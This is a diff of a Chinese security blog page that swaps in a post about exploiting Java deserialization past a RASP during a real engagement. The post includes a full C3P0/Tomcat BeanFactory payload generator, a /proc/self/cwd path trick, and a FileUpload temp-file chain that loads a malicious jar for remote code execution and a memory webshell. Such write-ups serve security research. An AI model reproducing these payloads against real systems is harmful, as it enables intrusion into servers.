@@ -6,17 +6,37 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>huahua&#39;s Blog</title>
+  <title>戴着镣铐跳舞-记一次java反序列化极端利用 | huahua&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Java RedTeam C2">
-<meta property="og:type" content="website">
-<meta property="og:title" content="huahua&#39;s Blog">
-<meta property="og:url" content="http://example.com/page/2/index.html">
+  <meta name="description" content="前言在某次实战中遇到了java原生反序列化入口点，由于这套系统之前知道有CB链，准备用CB2一把梭哈时，遇到了RASP拦截，于是便有了这次戴着镣铐跳舞的故事。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="戴着镣铐跳舞-记一次java反序列化极端利用">
+<meta property="og:url" content="http://example.com/2025/10/31/%E6%88%B4%E7%9D%80%E9%95%A3%E9%93%90%E8%B7%B3%E8%88%9E-%E8%AE%B0%E4%B8%80%E6%AC%A1java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%81%E7%AB%AF%E5%88%A9%E7%94%A8/index.html">
 <meta property="og:site_name" content="huahua&#39;s Blog">
-<meta property="og:description" content="Java RedTeam C2">
+<meta property="og:description" content="前言在某次实战中遇到了java原生反序列化入口点，由于这套系统之前知道有CB链，准备用CB2一把梭哈时，遇到了RASP拦截，于是便有了这次戴着镣铐跳舞的故事。">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2025/10/31/%E6%88%B4%E7%9D%80%E9%95%A3%E9%93%90%E8%B7%B3%E8%88%9E-%E8%AE%B0%E4%B8%80%E6%AC%A1java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%81%E7%AB%AF%E5%88%A9%E7%94%A8/images/image-20251031153354296.png">
+<meta property="og:image" content="http://example.com/2025/10/31/%E6%88%B4%E7%9D%80%E9%95%A3%E9%93%90%E8%B7%B3%E8%88%9E-%E8%AE%B0%E4%B8%80%E6%AC%A1java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%81%E7%AB%AF%E5%88%A9%E7%94%A8/images/image-20251031153701848.png">
+<meta property="og:image" content="http://example.com/2025/10/31/%E6%88%B4%E7%9D%80%E9%95%A3%E9%93%90%E8%B7%B3%E8%88%9E-%E8%AE%B0%E4%B8%80%E6%AC%A1java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%81%E7%AB%AF%E5%88%A9%E7%94%A8/images/image-20251031155649684.png">
+<meta property="og:image" content="http://example.com/2025/10/31/%E6%88%B4%E7%9D%80%E9%95%A3%E9%93%90%E8%B7%B3%E8%88%9E-%E8%AE%B0%E4%B8%80%E6%AC%A1java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%81%E7%AB%AF%E5%88%A9%E7%94%A8/images/image-20251031155721568.png">
+<meta property="og:image" content="http://example.com/2025/10/31/%E6%88%B4%E7%9D%80%E9%95%A3%E9%93%90%E8%B7%B3%E8%88%9E-%E8%AE%B0%E4%B8%80%E6%AC%A1java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%81%E7%AB%AF%E5%88%A9%E7%94%A8/images/image-20251031160633841.png">
+<meta property="og:image" content="http://example.com/2025/10/31/%E6%88%B4%E7%9D%80%E9%95%A3%E9%93%90%E8%B7%B3%E8%88%9E-%E8%AE%B0%E4%B8%80%E6%AC%A1java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%81%E7%AB%AF%E5%88%A9%E7%94%A8/images/image-20251031160912471.png">
+<meta property="og:image" content="http://example.com/2025/10/31/%E6%88%B4%E7%9D%80%E9%95%A3%E9%93%90%E8%B7%B3%E8%88%9E-%E8%AE%B0%E4%B8%80%E6%AC%A1java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%81%E7%AB%AF%E5%88%A9%E7%94%A8/images/image-20251031161512056.png">
+<meta property="og:image" content="http://example.com/2025/10/31/%E6%88%B4%E7%9D%80%E9%95%A3%E9%93%90%E8%B7%B3%E8%88%9E-%E8%AE%B0%E4%B8%80%E6%AC%A1java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%81%E7%AB%AF%E5%88%A9%E7%94%A8/images/image-20251031162638063.png">
+<meta property="og:image" content="http://example.com/2025/10/31/%E6%88%B4%E7%9D%80%E9%95%A3%E9%93%90%E8%B7%B3%E8%88%9E-%E8%AE%B0%E4%B8%80%E6%AC%A1java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%81%E7%AB%AF%E5%88%A9%E7%94%A8/images/image-20251031163517646.png">
+<meta property="og:image" content="http://example.com/2025/10/31/%E6%88%B4%E7%9D%80%E9%95%A3%E9%93%90%E8%B7%B3%E8%88%9E-%E8%AE%B0%E4%B8%80%E6%AC%A1java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%81%E7%AB%AF%E5%88%A9%E7%94%A8/images/image-20251031163605607.png">
+<meta property="og:image" content="http://example.com/2025/10/31/%E6%88%B4%E7%9D%80%E9%95%A3%E9%93%90%E8%B7%B3%E8%88%9E-%E8%AE%B0%E4%B8%80%E6%AC%A1java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%81%E7%AB%AF%E5%88%A9%E7%94%A8/images/image-20251031163953337.png">
+<meta property="og:image" content="http://example.com/2025/10/31/%E6%88%B4%E7%9D%80%E9%95%A3%E9%93%90%E8%B7%B3%E8%88%9E-%E8%AE%B0%E4%B8%80%E6%AC%A1java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%81%E7%AB%AF%E5%88%A9%E7%94%A8/images/image-20251031164851865.png">
+<meta property="og:image" content="http://example.com/2025/10/31/%E6%88%B4%E7%9D%80%E9%95%A3%E9%93%90%E8%B7%B3%E8%88%9E-%E8%AE%B0%E4%B8%80%E6%AC%A1java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%81%E7%AB%AF%E5%88%A9%E7%94%A8/images/image-20251031164958689.png">
+<meta property="og:image" content="http://example.com/2025/10/31/%E6%88%B4%E7%9D%80%E9%95%A3%E9%93%90%E8%B7%B3%E8%88%9E-%E8%AE%B0%E4%B8%80%E6%AC%A1java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%81%E7%AB%AF%E5%88%A9%E7%94%A8/images/image-20251031163605607.png">
+<meta property="og:image" content="http://example.com/2025/10/31/%E6%88%B4%E7%9D%80%E9%95%A3%E9%93%90%E8%B7%B3%E8%88%9E-%E8%AE%B0%E4%B8%80%E6%AC%A1java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%81%E7%AB%AF%E5%88%A9%E7%94%A8/images/image-20251031165411782.png">
+<meta property="og:image" content="http://example.com/2025/10/31/%E6%88%B4%E7%9D%80%E9%95%A3%E9%93%90%E8%B7%B3%E8%88%9E-%E8%AE%B0%E4%B8%80%E6%AC%A1java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%81%E7%AB%AF%E5%88%A9%E7%94%A8/images/image-20251031165444127.png">
+<meta property="article:published_time" content="2025-10-31T07:23:55.000Z">
+<meta property="article:modified_time" content="2025-11-06T01:36:45.437Z">
 <meta property="article:author" content="huahua">
+<meta property="article:tag" content="漏洞利用">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/10/31/%E6%88%B4%E7%9D%80%E9%95%A3%E9%93%90%E8%B7%B3%E8%88%9E-%E8%AE%B0%E4%B8%80%E6%AC%A1java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%81%E7%AB%AF%E5%88%A9%E7%94%A8/images/image-20251031153354296.png">
   
     <link rel="alternative" href="/atom.xml" title="huahua&#39;s Blog" type="application/atom+xml">
   
@@ -152,34 +172,117 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-一款根据ASM污点流扫描 Jsp Webshell的工具" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-戴着镣铐跳舞-记一次java反序列化极端利用" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/12/27/%E4%B8%80%E6%AC%BE%E6%A0%B9%E6%8D%AEASM%E6%B1%A1%E7%82%B9%E6%B5%81%E6%89%AB%E6%8F%8F%20Jsp%20Webshell%E7%9A%84%E5%B7%A5%E5%85%B7/">一款根据ASM污点流扫描 Jsp Webshell的工具</a>
+    <h1 class="article-title" itemprop="name">
+      戴着镣铐跳舞-记一次java反序列化极端利用
     </h1>
   
 
         
-        <a href="/2021/12/27/%E4%B8%80%E6%AC%BE%E6%A0%B9%E6%8D%AEASM%E6%B1%A1%E7%82%B9%E6%B5%81%E6%89%AB%E6%8F%8F%20Jsp%20Webshell%E7%9A%84%E5%B7%A5%E5%85%B7/" class="archive-article-date">
-  	<time datetime="2021-12-27T09:08:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-12-27</time>
+        <a href="/2025/10/31/%E6%88%B4%E7%9D%80%E9%95%A3%E9%93%90%E8%B7%B3%E8%88%9E-%E8%AE%B0%E4%B8%80%E6%AC%A1java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%81%E7%AB%AF%E5%88%A9%E7%94%A8/" class="archive-article-date">
+  	<time datetime="2025-10-31T07:23:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-10-31</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前浏览先知的时候看到了4ra1n师傅的一篇文章<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10622">《基于污点分析的JSP Webshell检测》</a>，觉得写的很好，之前在看三梦师傅的<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7058#toc-5">《java反序列化利用链自动挖掘工具gadgetinspector源码浅析》</a>，其中用到技术也是asm污点跟踪，当时看了很多遍都没看明白。这次在4ra1n师傅发表过关于asm污点跟踪的文章后我决定以该文章为起点，再重新学习一下这方面的知识。出于安服仔的实用性考虑，在对<a target="_blank" rel="noopener" href="https://github.com/EmYiQing/JSPKiller/">https://github.com/EmYiQing/JSPKiller/</a> 进行研究后发现了该工具可适用于实验室环境，但可能无法较好的运用于真实攻防场景，于是决定设计一款同样依据asm污点跟踪的jsp webshell查找工具—JspFinder。虽然都是asm污点跟踪，但运转逻辑却和JSPKillder不大相同。接下来进入正文。</p>
-        
-          <a class="article-more-a" href="/2021/12/27/%E4%B8%80%E6%AC%BE%E6%A0%B9%E6%8D%AEASM%E6%B1%A1%E7%82%B9%E6%B5%81%E6%89%AB%E6%8F%8F%20Jsp%20Webshell%E7%9A%84%E5%B7%A5%E5%85%B7/#more">more >></a>
-        
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在某次实战中遇到了java原生反序列化入口点，由于这套系统之前知道有CB链，准备用CB2一把梭哈时，遇到了RASP拦截，于是便有了这次戴着镣铐跳舞的故事。</p>
+<span id="more"></span>
+
+<h2 id="判断检测原理"><a href="#判断检测原理" class="headerlink" title="判断检测原理"></a>判断检测原理</h2><p>当使用CB链攻击时，目标报错</p>
+<p><img src="images/image-20251031153354296.png" alt="image-20251031153354296"></p>
+<p>使用反序列化炸弹(FindClassByBomb)时，正常反序列化成功，产生超长延时。说明目标RASP的拦截逻辑并非时阻拦反序列化，而是阻拦其所认为“恶意类”的反序列化。那么此处就存在绕过空间。</p>
+<p><img src="images/image-20251031153701848.png" alt="image-20251031153701848"></p>
+<h2 id="寻找可用链-Tomcat-Reference初试"><a href="#寻找可用链-Tomcat-Reference初试" class="headerlink" title="寻找可用链-Tomcat Reference初试"></a>寻找可用链-Tomcat Reference初试</h2><p>同事在测试常用链后给出了情报，C3P0链可用，但坏消息是目标不出网，因此无法直接通过出网RCE。</p>
+<p>C3P0反序列化链有两种玩法，第一种玩法：出网拉URLClassLoader，实例化远程恶意类去RCE。第二种玩法：通过本地可用的Reference去RCE。首先我们想到了Tomcat的org.apache.naming.factory.BeanFactory类，通过org.apache.naming.factory.BeanFactory调用EL表达式执行代码，这是在jndi注入时如果目标存在Tomcat8+并且jdk高版本时的一种绕过方式，不了解的可以见：<a target="_blank" rel="noopener" href="https://paper.seebug.org/942/#classreference-factory%E3%80%82">https://paper.seebug.org/942/#classreference-factory。</a></p>
+<p>此时构造了第一个反序列化生成脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line">import javax.naming.Reference;</span><br><span class="line">import javax.naming.Referenceable;</span><br><span class="line">import javax.naming.StringRefAddr;</span><br><span class="line">import javax.sql.ConnectionPoolDataSource;</span><br><span class="line">import javax.sql.PooledConnection;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.sql.SQLException;</span><br><span class="line">import java.sql.SQLFeatureNotSupportedException;</span><br><span class="line">import java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line">public class C3P0_H &#123;</span><br><span class="line">    public static class C3P0 implements ConnectionPoolDataSource, Referenceable &#123;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public Reference getReference() throws NamingException &#123;</span><br><span class="line">            ResourceRef resourceRef &#x3D; new ResourceRef(&quot;javax.el.ELProcessor&quot;, (String)null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);</span><br><span class="line">            resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;faster&#x3D;eval&quot;));</span><br><span class="line">            resourceRef.add(new StringRefAddr(&quot;faster&quot;, &quot;java.lang.Thread.sleep(5000)&quot;));</span><br><span class="line">            return resourceRef;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public PooledConnection getPooledConnection() throws SQLException &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public PooledConnection getPooledConnection(String user, String password) throws SQLException &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public PrintWriter getLogWriter() throws SQLException &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void setLogWriter(PrintWriter out) throws SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void setLoginTimeout(int seconds) throws SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public int getLoginTimeout() throws SQLException &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public Logger getParentLogger() throws SQLFeatureNotSupportedException &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void unserialize(byte[] bytes) throws Exception&#123;</span><br><span class="line">        try(ByteArrayInputStream bain &#x3D; new ByteArrayInputStream(bytes);</span><br><span class="line">            ObjectInputStream oin &#x3D; new ObjectInputStream(bain))&#123;</span><br><span class="line">            oin.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] serialize(ConnectionPoolDataSource lp) throws Exception&#123;</span><br><span class="line">        PoolBackedDataSourceBase poolBackedDataSourceBase &#x3D; new PoolBackedDataSourceBase(false);</span><br><span class="line">        Field connectionPoolDataSourceField &#x3D; PoolBackedDataSourceBase.class.getDeclaredField(&quot;connectionPoolDataSource&quot;);</span><br><span class="line">        connectionPoolDataSourceField.setAccessible(true);</span><br><span class="line">        connectionPoolDataSourceField.set(poolBackedDataSourceBase,lp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        try(ByteArrayOutputStream baout &#x3D; new ByteArrayOutputStream();</span><br><span class="line">            ObjectOutputStream oout &#x3D; new ObjectOutputStream(baout))&#123;</span><br><span class="line">            oout.writeObject(poolBackedDataSourceBase);</span><br><span class="line">            return baout.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        C3P0_Local.C3P0 exp &#x3D; new C3P0();</span><br><span class="line">        byte[] bytes &#x3D; serialize(exp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这时候我们遇到了第一个问题，发送exp后报错如下：</p>
+<p><img src="images/image-20251031155649684.png" alt="image-20251031155649684"></p>
+<p>首先我们怀疑这不是Tomcat系统，但仔细看了下堆栈，这无疑就是Tomcat</p>
+<p><img src="images/image-20251031155721568.png" alt="image-20251031155721568"></p>
+<p>于是我通过FindClassByBomb链探测了org.apache.naming.factory.BeanFactory类，发现该类存在。矛盾的结论迫使我去翻看C3P0的代码</p>
+<p>com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized#getObject</p>
+<p><img src="images/image-20251031160633841.png" alt="image-20251031160633841"></p>
+<p>com.mchange.v2.naming.ReferenceableUtils#referenceToObject</p>
+<p><img src="images/image-20251031160912471.png" alt="image-20251031160912471"></p>
+<p>从这里看没什么毛病，ClassLoader是Thread.currentThread获取的，肯定能获取到中间件中的类。于是我怀疑目标的C3P0的代码是不是不和我们一样，于是我找了一个老版本的C3P0的Jar包，发现其com.mchange.v2.naming.ReferenceableUtils#referenceToObject代码如下</p>
+<p><img src="images/image-20251031161512056.png" alt="image-20251031161512056"></p>
+<p>显然老版本用的是系统类加载器，这个加载器是获取不到中间件的类的，所以我们目标应当是这种情况。不过路也不是完全不通，从上面代码看，如果fClassLocation如果不是空，那么会通过一个URLClassLoader去加载类。此时我才开始认真的研究序列化生成的脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ResourceRef resourceRef &#x3D; new ResourceRef(&quot;javax.el.ELProcessor&quot;, (String)null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);</span><br></pre></td></tr></table></figure>
+
+<p>首先映射一下序列化内容和referenceToObject方法参数的对应关系：</p>
+<p>org.apache.naming.factory.BeanFactory –&gt;fClassName</p>
+<p>ResourceRef对象最后一个参数null –&gt; fClassLocation</p>
+<p>所以这个URLClassLoader的索引路径我们是可以在序列化过程中指定的，org.apache.naming.factory.BeanFactory类是在catalina.jar中，在黑盒情况下如何索引到目标catalina.jar的位置？</p>
+<p>CTF，启动！！！</p>
+<p>在linux中，Tomcat的JVM环境下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;proc&#x2F;self&#x2F;cwd --&gt; &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;apache-tomcat-xxx&#x2F;webapps</span><br></pre></td></tr></table></figure>
+
+<p>因此通过下面的序列化代码可以索引到catalina.jar</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ResourceRef resourceRef &#x3D; new ResourceRef(&quot;javax.el.ELProcessor&quot;, (String)null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, file:&#x2F;&#x2F;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;..&#x2F;lib&#x2F;catalina.jar);</span><br></pre></td></tr></table></figure>
+
+<p>此时出现了新的报错，但好像消息是org.apache.naming.factory.BeanFactory已经被索引到了。而我们研究了报错的这段代码后发现，这个报错应当是不影响javax.el.ELProcessor被触发的。</p>
+<p><img src="images/image-20251031162638063.png" alt="image-20251031162638063"></p>
+<p>于是再次确认后发现，目标没有javax.el.ELProcessor这个类，也就说明目标很可能是Tomcat7及以下</p>
+<p>随后我想到了浅蓝师傅曾经发过一篇文章：<a target="_blank" rel="noopener" href="https://tttang.com/archive/1405/#toc_nativelibloader%EF%BC%8C%E7%BB%99%E5%87%BA%E4%BA%86%E6%9B%BF%E6%8D%A2javax.el.ELProcessor%E7%9A%84%E4%B8%80%E4%BA%9B%E6%96%B9%E5%BC%8F%E3%80%82%E4%BD%86%E5%AE%9E%E6%B5%8B%E5%90%8E%E5%8F%91%E7%8E%B0%EF%BC%8C%E4%BE%8B%E5%A6%82%EF%BC%9AXstream/Groovy%E7%AD%89%E7%9B%AE%E6%A0%87%E7%8E%AF%E5%A2%83%E9%83%BD%E6%B2%A1%E6%9C%89%E3%80%82%E5%88%B0%E6%AD%A4%E5%88%BB%E4%B8%BA%E6%AD%A2%E8%B7%AF%E5%8F%88%E6%96%AD%E4%BA%86%E3%80%82">https://tttang.com/archive/1405/#toc_nativelibloader，给出了替换javax.el.ELProcessor的一些方式。但实测后发现，例如：Xstream/Groovy等目标环境都没有。到此刻为止路又断了。</a></p>
+<h2 id="FileUpload链-组合拳"><a href="#FileUpload链-组合拳" class="headerlink" title="FileUpload链+组合拳"></a>FileUpload链+组合拳</h2><p>在我不断测试后发现，FileUpload1链没有引发目标的RASP拦截，但我也不确定到底有没有利用成功，因此我随便发了个包测试了下</p>
+<p><img src="images/image-20251031163517646.png" alt="image-20251031163517646"></p>
+<p>收到报错，说明确实成功了，但文件名看起来无法预测</p>
+<p><img src="images/image-20251031163605607.png" alt="image-20251031163605607"></p>
+<p>此时我想到了前段时间网上很火的mysql connect不出网利用，他也用到了commons-fileuploads,根据其理论，每次上传后文件名只会变动UniqueId部分，而这部分是自增的，该理论我搭建环境复线后发现确实如此。因此我只要FileUpload链写一次不存在目录触发报错，获得upload_b85a4be8_6ea8_4917_939e_f1de9bddd780_00000097.tmp</p>
+<p>然后我在用FileUpload链写文件，那么此时这个临时文件的名字就为upload_b85a4be8_6ea8_4917_939e_f1de9bddd780_00000098.tmp</p>
+<p><img src="images/image-20251031163953337.png" alt="image-20251031163953337"></p>
+<p>截止目前为止，获取到的所有信息如下：</p>
+<p>1、C3P0链可以反序列化本地Reference</p>
+<p>2、FileUpload链可以用，该链写文件时会在/tmp下生成一个临时文件，此文件名和后缀均不可控，但能通过技巧预测到文件名。</p>
+<p>而同时我们上文提到，C3P0在反序列化过程中使用了URLClassLoader加载类并实例化，这个路径和类名是可控的，于是我设计了一种方案：</p>
+<p>1、本地生成一个恶意的jar包，代码如下</p>
+<p><img src="images/image-20251031164851865.png" alt="image-20251031164851865"></p>
+<p>2、通过FileUpload写入上面这个jar，此时/tmp/目录下会生成一个tmp文件</p>
+<p><img src="images/image-20251031164958689.png" alt="image-20251031164958689"></p>
+<p>3、写不存在目录触发报错获得upload_b85a4be8_6ea8_4917_939e_f1de9bddd780_00000097.tmp</p>
+<p><img src="images/image-20251031163605607.png" alt="image-20251031163605607"></p>
+<p>4、重复步骤2，此时这个jar在目标上会生成，同时其绝对路径为/tmp/upload_b85a4be8_6ea8_4917_939e_f1de9bddd780_00000098.tmp</p>
+<p>5、修改序列化脚本如下，然后再发一次C3P0的反序列化包</p>
+<p>ResourceRef resourceRef = new ResourceRef(“javax.el.ELProcessor”, (String)null, “”, “”, true, “com.test”, file:///tmp/upload_b85a4be8_6ea8_4917_939e_f1de9bddd780_00000098.tmp);</p>
+<p>调用到newInstance，触发我们的恶意代码，最终完成RCE～<img src="images/image-20251031165411782.png" alt="image-20251031165411782"></p>
+<p>从回包来看，延时5秒，后面把恶意jar中的代码换成内存马注入代码即获取到webshell</p>
+<p><img src="images/image-20251031165444127.png" alt="image-20251031165444127"></p>
+<h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>后面拿到shell后验证发现，其实FileUpload链在目标利用是有问题的，因为正常的FileUpload链是可以指定目录和文件名写的，而目标却无法写入，只是commons-fileupload这个包恰好会生成临时文件，然后这个点被我们抓到了而已。</p>
+
       
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
       
     </div>
     <div class="article-info article-info-index">
@@ -190,7 +293,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全工具</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞利用</a>
         		</li>
       		
 		</ul>
@@ -199,16 +302,75 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/12/27/%E4%B8%80%E6%AC%BE%E6%A0%B9%E6%8D%AEASM%E6%B1%A1%E7%82%B9%E6%B5%81%E6%89%AB%E6%8F%8F%20Jsp%20Webshell%E7%9A%84%E5%B7%A5%E5%85%B7/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
